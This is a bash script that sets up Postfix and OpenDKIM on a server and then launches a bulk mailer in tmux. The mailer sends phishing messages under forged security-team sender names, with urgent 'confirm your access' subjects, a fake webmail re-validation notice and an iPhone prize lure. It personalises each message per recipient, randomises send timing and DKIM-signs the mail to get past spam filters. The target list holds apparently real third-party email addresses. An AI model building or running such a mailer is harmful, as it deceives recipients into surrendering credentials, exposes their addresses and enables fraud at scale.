#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
milter_default_action = accept
milter_protocol = 2
smtpd_milters = inet:localhost:12301
non_smtpd_milters = inet:localhost:12301
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo chown $USER:$USER *

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL
<html>
<body>
  <h1>PrimeRewardSpot iPhone 16 Pro</h1>
  <p>Congratulations! You are eligible to win an iPhone 16 Pro.</p>
</body>
</html>
EOL

# Create subject.txt
cat > subject.txt <<EOL
{recipient-user}, confirm your access
Revalidate by {date}
{time} security check required
{recipient-domain} access expiring
{recipient-user}, confirm access
{time} security check
{recipient-domain} access alert
Last chance: {date}
{recipient-user} validation
Expire {date} - act
Secure {recipient-domain}
{recipient-user} must confirm
{recipient-user} re-auth
Before {date}
{time} confirm now
Protect {recipient-domain}
{recipient-user} validate
EOL

# Create name.txt
cat > name.txt <<EOL
IT Governance
Mail Shield
Domain Guardian
Inbox Sentinel
Cyber Patrol
Firewall Watch
Secure Gateway
Data Bastion
Threat Response
EOL

# Create list.txt
cat > list.txt <<EOL
boxxfc@gmail.com
info@brickx.us
mackenzie@walshequipment.ca
podpora@vsezapivo.si
EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Verify required files exist
for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Process each email
while IFS= read -r email; do
    # Clean and parse email address
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    # Generate random elements
    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
    
    # Select subject and REPLACE ITS VARIABLES
    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"
    
    # Generate unique Message-ID
    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
    
    # Create temporary HTML file with replaced variables
    TEMP_HTML=\$(mktemp)
    sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
        -e "s|{sender-email}|$username@$domain|g" \
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
        "\$HTML_TEMPLATE" > "\$TEMP_HTML"
    
    # Send with dynamic content
    # Create text version
    TEMP_TEXT=\$(mktemp)
    cat <<EOF > "\$TEMP_TEXT"
Webmail - Mail. Host. Online

Email Account Status Changed

Hi \$EMAIL_USER,

We are reaching out to inform you that your webmail account requires re-validation before June 10, 2025 to ensure continued access.

Reactivate now by visiting your webmail portal.

You received this email because you are registered. This is to ensure compliance with our Terms of Service or other legitimate matters.

Privacy Policy © 2004–2025 Webmail International Ltd.
EOF

# Send with both HTML and text
cat <<EOF | /usr/sbin/sendmail -t -oi
Return-Path: <$username@$domain>
From: "\$SELECTED_SENDER_NAME" <$username@$domain>
To: <\$CLEAN_EMAIL>
Subject: \$SELECTED_SUBJECT
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"

--MULTIPART_BOUNDARY
Content-Type: text/plain; charset=UTF-8

\$(cat "\$TEMP_TEXT")

--MULTIPART_BOUNDARY
Content-Type: text/html; charset=UTF-8

\$(cat "\$TEMP_HTML")

--MULTIPART_BOUNDARY--
EOF

    rm "\$TEMP_TEXT"

    # Check exit status and clean up
    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi
    
    rm "\$TEMP_HTML"
    
    # Dynamic delay (0.5-3 seconds)
    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')
    
    # Progress indicator
    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
    
done < "\$EMAIL_LIST"

# Final report
echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Start tmux session
tmux new-session -d -s mail_session "./send.sh"
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"

#####################################
# DKIM Setup (Appended at the End) #
#####################################
echo "Installing OpenDKIM..."
sudo apt install opendkim opendkim-tools -y

echo "Setting up DKIM directory structure..."
sudo mkdir -p /etc/opendkim/keys/$domain
cd /etc/opendkim/keys/$domain
sudo opendkim-genkey -s bulkmail -d $domain
sudo chown opendkim:opendkim bulkmail.private

# SigningTable
sudo tee /etc/opendkim/SigningTable > /dev/null <<EOL
*@$domain bulkmail._domainkey.$domain
EOL

# KeyTable
sudo tee /etc/opendkim/KeyTable > /dev/null <<EOL
bulkmail._domainkey.$domain $domain:bulkmail:/etc/opendkim/keys/$domain/bulkmail.private
EOL

# TrustedHosts
sudo tee /etc/opendkim/TrustedHosts > /dev/null <<EOL
127.0.0.1
localhost
$domain
EOL

# opendkim.conf
sudo tee /etc/opendkim.conf > /dev/null <<EOL
Socket                  inet:12301@localhost
PidFile                 /run/opendkim/opendkim.pid
UserID                  opendkim
UMask                   002

Syslog                  yes
SyslogSuccess           yes

Canonicalization        relaxed/simple
Mode                    sv
SubDomains              no
AutoRestart             yes
AutoRestartRate         10/1h
Background              yes
OversignHeaders         From

Domain                  $domain
Selector                bulkmail
KeyFile                 /etc/opendkim/keys/$domain/bulkmail.private
SigningTable            refile:/etc/opendkim/SigningTable
KeyTable                refile:/etc/opendkim/KeyTable
InternalHosts           /etc/opendkim/TrustedHosts
ExternalIgnoreList      /etc/opendkim/TrustedHosts

TrustAnchorFile         /usr/share/dns/root.key
EOL

# Fix permissions
sudo chown -R opendkim:opendkim /etc/opendkim
sudo chmod -R go-rwx /etc/opendkim/keys

# Restart services
sudo service opendkim restart
sudo service postfix restart

echo "DKIM setup completed for $domain."
echo "Don't forget to publish the DKIM DNS TXT record located in /etc/opendkim/keys/$domain/bulkmail.txt"
